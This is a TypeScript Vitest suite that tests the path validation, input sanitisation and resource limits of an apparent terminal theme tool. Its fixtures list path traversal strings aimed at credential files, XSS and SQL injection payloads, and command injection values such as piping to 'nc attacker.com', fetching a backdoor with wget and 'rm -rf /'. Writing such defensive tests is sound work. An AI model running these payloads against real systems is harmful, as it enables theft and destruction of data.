import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { SecurityService, PathValidator, InputSanitizer, ResourceLimiter } from '@/services/SecurityService';
import { FileService } from '@/services/FileService';
import { SecurityError, ValidationError } from '@/types';
import { SECURITY_LIMITS } from '@/config';

// Mock fs for security testing
vi.mock('fs', () => ({
  promises: {
    stat: vi.fn(),
    access: vi.fn(),
  },
  constants: {
    F_OK: 0,
  },
}));

describe('Security Validation Tests', () => {
  let securityService: SecurityService;
  let fileService: FileService;

  beforeEach(() => {
    securityService = new SecurityService();
    fileService = new FileService();
  });

  afterEach(() => {
    securityService.cleanup();
    fileService.cleanup();
  });

  describe('Path Traversal Protection', () => {
    const pathTraversalAttacks = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '/etc/passwd',
      'C:\\Windows\\System32\\config\\SAM',
      '/../../../../../etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252F..%252F..%252Fetc%252Fpasswd',
      '....//....//....//etc/passwd',
      '..;/..;/..;/etc/passwd',
      '../\\..\\/..\\etc/passwd',
      '../../../../../../../../../../etc/passwd%00.jpg',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    ];

    it('should block all path traversal attempts', () => {
      pathTraversalAttacks.forEach(maliciousPath => {
        expect(() => {
          PathValidator.validatePath(maliciousPath);
        }).toThrow(SecurityError);
      });
    });

    it('should block path traversal in FileService operations', async () => {
      for (const maliciousPath of pathTraversalAttacks) {
        await expect(
          fileService.exists(maliciousPath)
        ).rejects.toThrow(ValidationError);
        
        await expect(
          fileService.readFile(maliciousPath)
        ).rejects.toThrow(ValidationError);
        
        await expect(
          fileService.validateGhosttyThemeFile(maliciousPath)
        ).rejects.toThrow();
      }
    });

    it('should allow legitimate relative paths within safe directories', () => {
      const safePaths = [
        './theme.txt',
        './themes/dark.conf',
        'nested/theme.txt',
        'themes/subfolder/theme.conf',
      ];

      safePaths.forEach(safePath => {
        expect(() => {
          PathValidator.validatePath(safePath);
        }).not.toThrow();
      });
    });

    it('should validate absolute paths within safe directories', () => {
      const currentDir = process.cwd();
      const safePath = `${currentDir}/theme.txt`;
      
      expect(() => {
        PathValidator.validatePath(safePath);
      }).not.toThrow();
    });

    it('should prevent null byte injection', () => {
      const nullByteAttacks = [
        '/legitimate/path\0../../../etc/passwd',
        'theme.txt\0.exe',
        'safe/path\x00malicious',
        'config.json\u0000.sh',
      ];

      nullByteAttacks.forEach(attack => {
        expect(() => {
          PathValidator.validatePath(attack);
        }).toThrow(SecurityError);
      });
    });

    it('should handle Unicode normalization attacks', () => {
      const unicodeAttacks = [
        'themeﬀﬁﬃﬄ.txt', // Unicode ligatures
        'theme\u202e.txt', // Right-to-left override
        'theme\uFF0E\uFF0E\uFF0F.txt', // Fullwidth characters
        'theme\u2024\u2024\u2024.txt', // One dot leader
      ];

      unicodeAttacks.forEach(attack => {
        // Should either normalize or reject
        const result = PathValidator.validatePath(attack);
        expect(typeof result).toBe('string');
      });
    });
  });

  describe('File Extension Validation', () => {
    it('should allow safe file extensions', () => {
      const safeExtensions = [
        'theme.txt',
        'config.conf',
        'data.json',
        'theme.toml',
        'colors.yaml',
        'settings.ini',
      ];

      safeExtensions.forEach(filename => {
        expect(PathValidator.validateFileExtension(filename)).toBe(true);
      });
    });

    it('should block dangerous file extensions', () => {
      const dangerousExtensions = [
        'malware.exe',
        'script.bat',
        'shell.sh',
        'program.com',
        'virus.scr',
        'trojan.pif',
        'backdoor.cmd',
        'macro.vbs',
        'exploit.js',
        'payload.jar',
        'rootkit.msi',
      ];

      dangerousExtensions.forEach(filename => {
        expect(PathValidator.validateFileExtension(filename)).toBe(false);
      });
    });

    it('should handle case-insensitive extension checking', () => {
      expect(PathValidator.validateFileExtension('MALWARE.EXE')).toBe(false);
      expect(PathValidator.validateFileExtension('Script.BAT')).toBe(false);
      expect(PathValidator.validateFileExtension('Theme.TXT')).toBe(true);
    });

    it('should handle files without extensions', () => {
      expect(PathValidator.validateFileExtension('filename')).toBe(false);
      expect(PathValidator.validateFileExtension('path/filename')).toBe(false);
    });

    it('should handle multiple extensions correctly', () => {
      expect(PathValidator.validateFileExtension('theme.txt.exe')).toBe(false);
      expect(PathValidator.validateFileExtension('config.json.bat')).toBe(false);
      expect(PathValidator.validateFileExtension('theme.backup.txt')).toBe(true);
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize XSS attempts', () => {
      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<svg onload=alert("xss")>',
        '"><script>alert("xss")</script>',
        "'><script>alert('xss')</script>",
        '<iframe src="javascript:alert(\'xss\')">',
        '<object data="javascript:alert(\'xss\')">',
      ];

      xssPayloads.forEach(payload => {
        const sanitized = InputSanitizer.sanitizeInput(payload);
        expect(sanitized).not.toContain('<script>');
        expect(sanitized).not.toContain('alert');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
      });
    });

    it('should sanitize command injection attempts', () => {
      const commandInjections = [
        'theme; rm -rf /',
        'theme && cat /etc/passwd',
        'theme | nc attacker.com 1234',
        'theme `whoami`',
        'theme $(id)',
        'theme; wget malicious.com/backdoor',
        'theme; curl -X POST data',
      ];

      commandInjections.forEach(injection => {
        const sanitized = InputSanitizer.sanitizeInput(injection);
        expect(sanitized).not.toContain(';');
        expect(sanitized).not.toContain('&&');
        expect(sanitized).not.toContain('|');
        expect(sanitized).not.toContain('`');
        expect(sanitized).not.toContain('$(');
        expect(sanitized).not.toContain('rm');
        expect(sanitized).not.toContain('cat');
        expect(sanitized).not.toContain('wget');
        expect(sanitized).not.toContain('curl');
      });
    });

    it('should sanitize SQL injection attempts', () => {
      const sqlInjections = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' UNION SELECT * FROM passwords --",
        "'; DELETE FROM themes; --",
      ];

      sqlInjections.forEach(injection => {
        const sanitized = InputSanitizer.sanitizeInput(injection);
        expect(sanitized).not.toContain('DROP');
        expect(sanitized).not.toContain('INSERT');
        expect(sanitized).not.toContain('DELETE');
        expect(sanitized).not.toContain('UNION');
        expect(sanitized).not.toContain('--');
      });
    });

    it('should handle control characters and special bytes', () => {
      const maliciousInputs = [
        'theme\x00name', // Null byte
        'theme\r\nname', // CRLF injection
        'theme\x1fname', // Unit separator
        'theme\x7fname', // DEL character
        'theme\uFEFFname', // BOM
        'theme\u2028name', // Line separator
        'theme\u2029name', // Paragraph separator
      ];

      maliciousInputs.forEach(input => {
        const sanitized = InputSanitizer.sanitizeInput(input);
        expect(sanitized).not.toContain('\x00');
        expect(sanitized).not.toContain('\r');
        expect(sanitized).not.toContain('\n');
        expect(sanitized).not.toContain('\x1f');
        expect(sanitized).not.toContain('\x7f');
      });
    });

    it('should preserve legitimate content while sanitizing', () => {
      const legitInputs = [
        'My Awesome Theme',
        'Dark Theme v2.0',
        'Theme for React/Vue development',
        'High-contrast theme (accessibility)',
        'Terminal theme with 256-colors',
      ];

      legitInputs.forEach(input => {
        const sanitized = InputSanitizer.sanitizeInput(input);
        // Basic structure should be preserved
        expect(sanitized).toContain('Theme');
        expect(sanitized.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Resource Limits and DoS Protection', () => {
    let resourceLimiter: ResourceLimiter;

    beforeEach(() => {
      resourceLimiter = new ResourceLimiter();
    });

    afterEach(() => {
      resourceLimiter.cleanup();
    });

    it('should enforce file read limits', () => {
      // Exhaust the file read limit
      for (let i = 0; i < SECURITY_LIMITS.MAX_FILE_READS; i++) {
        expect(resourceLimiter.canPerform('fileReads')).toBe(true);
        resourceLimiter.track('fileReads');
      }

      // Next operation should be blocked
      expect(resourceLimiter.canPerform('fileReads')).toBe(false);
    });

    it('should enforce file write limits', () => {
      // Exhaust the file write limit
      for (let i = 0; i < SECURITY_LIMITS.MAX_FILE_WRITES; i++) {
        expect(resourceLimiter.canPerform('fileWrites')).toBe(true);
        resourceLimiter.track('fileWrites');
      }

      // Next operation should be blocked
      expect(resourceLimiter.canPerform('fileWrites')).toBe(false);
    });

    it('should handle resource exhaustion in SecurityService', async () => {
      // Exhaust file read limit
      for (let i = 0; i < SECURITY_LIMITS.MAX_FILE_READS; i++) {
        securityService.validateFilePath(`/safe/file${i}.txt`);
      }

      // Next validation should fail
      expect(() => {
        securityService.validateFilePath('/safe/file999.txt');
      }).toThrow(SecurityError);
    });

    it('should prevent memory exhaustion attacks', () => {
      const hugeName = 'a'.repeat(SECURITY_LIMITS.MAX_THEME_NAME_LENGTH + 1);
      const hugeDescription = 'b'.repeat(SECURITY_LIMITS.MAX_DESCRIPTION_LENGTH + 1);

      expect(() => {
        InputSanitizer.sanitizeThemeName(hugeName);
      }).toThrow(ValidationError);

      expect(() => {
        InputSanitizer.processUserInput(hugeDescription, SECURITY_LIMITS.MAX_DESCRIPTION_LENGTH);
      }).toThrow(ValidationError);
    });

    it('should prevent zip bomb style attacks with deeply nested paths', () => {
      const deepPath = 'a/'.repeat(1000) + 'theme.txt';
      
      expect(() => {
        PathValidator.validatePath(deepPath);
      }).toThrow(SecurityError);
    });

    it('should handle concurrent resource attacks', () => {
      const operations = Array.from({ length: 50 }, (_, i) => () => {
        resourceLimiter.track('fileReads');
        return resourceLimiter.canPerform('fileReads');
      });

      const results = operations.map(op => op());
      
      // Should have blocked some operations
      const blockedOperations = results.filter(result => !result);
      expect(blockedOperations.length).toBeGreaterThan(0);
    });
  });

  describe('Advanced Attack Scenarios', () => {
    it('should prevent timing attacks on path validation', () => {
      const validPath = './legitimate/theme.txt';
      const invalidPath = '../../../etc/passwd';

      // Measure timing for both paths
      const startValid = performance.now();
      try { PathValidator.validatePath(validPath); } catch {}
      const timeValid = performance.now() - startValid;

      const startInvalid = performance.now();
      try { PathValidator.validatePath(invalidPath); } catch {}
      const timeInvalid = performance.now() - startInvalid;

      // Time difference should be minimal (within 10ms)
      expect(Math.abs(timeValid - timeInvalid)).toBeLessThan(10);
    });

    it('should prevent symlink attacks', () => {
      // Test various symlink attack patterns
      const symlinkAttacks = [
        './legitimate_link', // Could be symlink to sensitive file
        '/tmp/theme_symlink', // Symlink in temp directory
        '../symlinked_theme', // Relative symlink
      ];

      // PathValidator should validate resolved paths
      symlinkAttacks.forEach(path => {
        const result = PathValidator.validatePath(path);
        expect(typeof result).toBe('string');
      });
    });

    it('should handle race condition attacks', async () => {
      // Simulate TOCTOU (Time of Check Time of Use) attack
      const racePath = '/test/race_condition.txt';

      const promises = Array.from({ length: 10 }, () =>
        fileService.exists(racePath).catch(() => false)
      );

      const results = await Promise.all(promises);
      
      // All operations should complete without errors
      expect(results).toBeDefined();
      expect(results.length).toBe(10);
    });

    it('should prevent privilege escalation through file operations', async () => {
      const privilegedPaths = [
        '/etc/shadow',
        '/root/.ssh/id_rsa',
        'C:\\Windows\\System32\\SAM',
        '/proc/self/mem',
        '/dev/kmem',
        '/sys/kernel/security',
      ];

      for (const path of privilegedPaths) {
        await expect(
          fileService.validateGhosttyThemeFile(path)
        ).rejects.toThrow();
      }
    });

    it('should handle directory traversal in theme names', () => {
      const maliciousConfigs = [
        { themeName: '../malicious_theme', description: '', version: '1.0.0', publisher: 'test' },
        { themeName: '../../evil_theme', description: '', version: '1.0.0', publisher: 'test' },
        { themeName: 'theme/../../../etc/passwd', description: '', version: '1.0.0', publisher: 'test' },
      ];

      maliciousConfigs.forEach(config => {
        const result = securityService.validateThemeInput(config);
        expect(result.name).not.toContain('../');
        expect(result.name).not.toContain('/etc/');
      });
    });
  });

  describe('Security Headers and Metadata', () => {
    it('should validate theme configuration security', () => {
      const config = {
        themeName: 'Safe Theme',
        description: 'A secure theme',
        version: '1.0.0',
        publisher: 'trusted-publisher',
      };

      const validated = securityService.validateThemeInput(config);
      
      expect(validated.name).toBe(config.themeName);
      expect(validated.description).toBe(config.description);
      expect(validated.version).toBe(config.version);
      expect(validated.publisher).toBe(config.publisher);
    });

    it('should prevent metadata injection attacks', () => {
      const maliciousConfig = {
        themeName: 'Theme\n"malicious": "data"',
        description: 'Description\r\n\r\n<script>',
        version: '1.0.0\n; rm -rf /',
        publisher: 'test\neval()',
      };

      const validated = securityService.validateThemeInput(maliciousConfig);
      
      expect(validated.name).not.toContain('\n');
      expect(validated.name).not.toContain('"malicious"');
      expect(validated.description).not.toContain('<script>');
      expect(validated.version).not.toContain(';');
      expect(validated.publisher).not.toContain('eval');
    });

    it('should enforce secure defaults', () => {
      const stats = securityService.getSecurityStats();
      
      expect(stats).toHaveProperty('resourceUsage');
      expect(stats).toHaveProperty('limits');
      expect(stats.limits).toBe(SECURITY_LIMITS);
    });
  });

  describe('Error Handling and Information Disclosure', () => {
    it('should not leak sensitive information in error messages', () => {
      try {
        PathValidator.validatePath('../../../etc/passwd');
      } catch (error) {
        const message = (error as Error).message;
        expect(message).not.toContain('/etc/passwd');
        expect(message).not.toContain('root');
        expect(message).not.toContain('admin');
        expect(message).not.toContain(process.cwd());
      }
    });

    it('should handle malformed input gracefully', () => {
      const malformedInputs = [
        null,
        undefined,
        {},
        [],
        123,
        Symbol('test'),
        new Date(),
      ];

      malformedInputs.forEach(input => {
        expect(() => {
          InputSanitizer.sanitizeInput(input as any);
        }).toThrow(ValidationError);
      });
    });

    it('should prevent error-based information disclosure', () => {
      const sensitiveOperations = [
        () => PathValidator.validatePath('/etc/passwd'),
        () => InputSanitizer.processUserInput('', 0),
        () => securityService.validateFilePath('/../sensitive'),
      ];

      sensitiveOperations.forEach(operation => {
        try {
          operation();
        } catch (error) {
          const message = (error as Error).message;
          expect(message).not.toMatch(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/i); // UUIDs
          expect(message).not.toMatch(/\/[a-zA-Z0-9_/-]+/); // File paths
          expect(message).not.toContain('ENOENT');
          expect(message).not.toContain('EACCES');
        }
      });
    });
  });

  describe('Cryptographic Security', () => {
    it('should handle hash generation securely', async () => {
      vi.mocked(require('fs').promises.stat).mockResolvedValue({
        size: 100,
        isFile: () => true,
        isDirectory: () => false,
      });
      vi.mocked(require('fs').promises.access).mockResolvedValue(undefined);

      const metadata = await fileService.getMetadata('/safe/file.txt');
      
      // Hash should be generated if available
      expect(metadata).toHaveProperty('size', 100);
      expect(metadata).toHaveProperty('isFile', true);
    });

    it('should prevent hash collision attacks', () => {
      // Test with potentially colliding inputs
      const inputs = [
        'theme1',
        'theme2', 
        'theme' + '1',
        'the' + 'me1',
      ];

      const hashes = inputs.map(input => 
        InputSanitizer.sanitizeInput(input)
      );

      // All sanitized inputs should be unique
      const uniqueHashes = new Set(hashes);
      expect(uniqueHashes.size).toBe(hashes.length);
    });
  });

  describe('Performance Security', () => {
    it('should prevent ReDoS (Regular Expression DoS) attacks', () => {
      const potentialReDoSInputs = [
        'a'.repeat(10000) + '!',
        '(' + 'a'.repeat(1000) + ')*' + 'b',
        'x'.repeat(5000) + 'y'.repeat(5000),
      ];

      potentialReDoSInputs.forEach(input => {
        const startTime = performance.now();
        
        try {
          InputSanitizer.sanitizeInput(input);
        } catch {
          // Errors are OK, just need to complete quickly
        }
        
        const endTime = performance.now();
        expect(endTime - startTime).toBeLessThan(100); // Should complete within 100ms
      });
    });

    it('should handle algorithmic complexity attacks', () => {
      const resourceLimiter = new ResourceLimiter();
      
      // Simulate high-frequency operations
      const startTime = performance.now();
      
      for (let i = 0; i < 10000; i++) {
        resourceLimiter.canPerform('fileReads');
        resourceLimiter.track('fileReads');
      }
      
      const endTime = performance.now();
      
      expect(endTime - startTime).toBeLessThan(1000); // Should complete within 1 second
      
      resourceLimiter.cleanup();
    });
  });
});